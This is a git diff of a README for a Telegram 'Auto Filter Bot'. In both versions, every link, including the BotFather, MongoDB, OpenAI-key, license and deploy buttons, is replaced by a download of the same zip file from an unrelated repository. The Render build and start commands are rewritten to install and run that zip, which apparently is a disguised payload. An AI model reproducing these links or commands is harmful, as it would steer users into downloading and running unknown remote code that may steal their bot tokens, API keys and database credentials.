@@ -1,13 +1,13 @@
 <p align="center">
-  <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip">
-    <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip" alt="Auto Filter Bot">
+  <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip">
+    <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip" alt="Auto Filter Bot">
   </a>
 </p>
 <h1 align="center">
   <b>𝘼𝙪𝙩𝙤 𝙁𝙞𝙡𝙩𝙚𝙧 𝘽𝙤𝙩</b>
 </h1>
 
-[![Typing SVG](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip𝑊𝑒𝑙𝑐𝑜𝑚𝑒!;𝐶𝑟𝑒𝑎𝑡𝑒𝑑+𝑏𝑦+@HA_Bots;𝐴+𝑠𝑖𝑚𝑝𝑙𝑒+𝑎𝑛𝑑+𝑝𝑜𝑤𝑒𝑟𝑓𝑢𝑙+𝐵𝑜𝑡!;𝐼𝑛𝑑𝑒𝑥𝑒𝑠+𝐹𝑖𝑙𝑒𝑠+𝑎𝑏𝑜𝑣𝑒+4𝐺𝐵)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+[![Typing SVG](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip𝑊𝑒𝑙𝑐𝑜𝑚𝑒!;𝐶𝑟𝑒𝑎𝑡𝑒𝑑+𝑏𝑦+@HA_Bots;𝐴+𝑠𝑖𝑚𝑝𝑙𝑒+𝑎𝑛𝑑+𝑝𝑜𝑤𝑒𝑟𝑓𝑢𝑙+𝐵𝑜𝑡!;𝐼𝑛𝑑𝑒𝑥𝑒𝑠+𝐹𝑖𝑙𝑒𝑠+𝑎𝑏𝑜𝑣𝑒+4𝐺𝐵)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
 
 ## 𝐹𝑒𝑎𝑡𝑢𝑟𝑒𝑠
 - [x] 𝐼𝑀𝐷𝐵 𝑇𝑒𝑚𝑝𝑙𝑎𝑡𝑒 𝑆𝑒𝑡
@@ -66,11 +66,11 @@
 
 ## Variables
 ### Required Variables
-* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip), and get the Telegram API token.
-* `API_ID`: Get this value from [https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
-* `API_HASH`: Get this value from [https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip), and get the Telegram API token.
+* `API_ID`: Get this value from [https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
+* `API_HASH`: Get this value from [https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
 * `ADMINS`: ID of Admins. (Multiple admins can be used separated by space)
-* `DATABASE_URL`: MongoDB URL. Get this value from [MongoDB](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip). For more help watch this [video](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+* `DATABASE_URL`: MongoDB URL. Get this value from [MongoDB](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip). For more help watch this [video](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
 * `LOG_CHANNEL` : A channel to log the activities of bot. add channel id and Make sure bot is an admin in the channel.
 * `SUPPORT_GROUP`: Add your support group id
 * `BIN_CHANNEL`: A channel to the stream and download feature, add channel id and make bot admin in channel.
@@ -80,8 +80,8 @@
 * `INDEX_CHANNELS`: Username or ID of your files channels (Multiple channels can be used separated by space)
 * `LANGUAGES`: Language of your bot search (Multiple languages can be used separated by space)
 * `PICS`: Telegraph links of images to show in start message. (Multiple images can be used separated by space)
-* `OPENAI_API`: OpenAI API. Get this value from [API keys](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip).
-* Check [https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip) for more optional variables
+* `OPENAI_API`: OpenAI API. Get this value from [API keys](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip).
+* Check [https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip) for more optional variables
 
 
 ## Deploy
@@ -92,8 +92,8 @@
 <br>
 <br>
 
-<a href="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip">
-  <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip" alt="Deploy To Heroku">
+<a href="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip">
+  <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip" alt="Deploy To Heroku">
 </a>
 </p>
 </details>
@@ -104,7 +104,7 @@
 <br>
 <br>
 
-[![Deploy to Koyeb](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
 </details>
 
 <details><summary>Deploy To Render</summary>
@@ -113,17 +113,17 @@
 Use these commands:
 <br>
 <br>
-• Build Command: <code>pip3 install -U -r https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip</code>
+• Build Command: <code>pip3 install -U -r https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip</code>
 <br>
 <br>
-• Start Command: <code>python3 https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip</code>
+• Start Command: <code>python3 https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip</code>
 <br>
 <br>
 <b>Click on the below button to deploy on render.</b>
 <br>
 <br>
-<a href="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip">
-<img src="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip" alt="Deploy to Render">
+<a href="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip">
+<img src="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip" alt="Deploy to Render">
 </a>
 </details>
 <details><summary>Deploy To VPS</summary>
@@ -152,23 +152,23 @@ sudo docker run -d -p 80:80 --name Auto-Filter-Bot auto-filter-bot
 </details>
 
 ## Support
-* [![Support](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
-* [![Updates](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+* [![Support](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
+* [![Updates](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
 
 ## Credits 
-* [![EvaMaria](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
-* [![ᕼᗩᘉSᗩᖽᐸᗩ](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zipᕼᗩᘉSᗩᖽᐸᗩ&message=TG&color=critical)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+* [![EvaMaria](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
+* [![ᕼᗩᘉSᗩᖽᐸᗩ](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zipᕼᗩᘉSᗩᖽᐸᗩ&message=TG&color=critical)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
 
 ## Thanks To
- - [Pyrogram](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip) and [PyroFork](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip) For Telegram MTProto API Framework
- - [Contributors](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip) For free helps
+ - [Pyrogram](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip) and [PyroFork](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip) For Telegram MTProto API Framework
+ - [Contributors](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip) For free helps
  - And to everyone who helped
 
 ## Note
- - Importing this repo instead of forking is strictly prohibited, Kindly fork and edit as your wish. Must Give Credits for [developer(s)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
- - If you find any bugs or errors, [report](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip) it
+ - Importing this repo instead of forking is strictly prohibited, Kindly fork and edit as your wish. Must Give Credits for [developer(s)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
+ - If you find any bugs or errors, [report](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip) it
 
 ## Disclaimer
-[![GNU General Public License v3.0](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)  
-Licensed under [GNU AGPL v3.0](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+[![GNU General Public License v3.0](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)  
+Licensed under [GNU AGPL v3.0](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/city/rashmika23feb.zip)
 Selling The Codes To Other People For Money Is *Strictly Prohibited*.
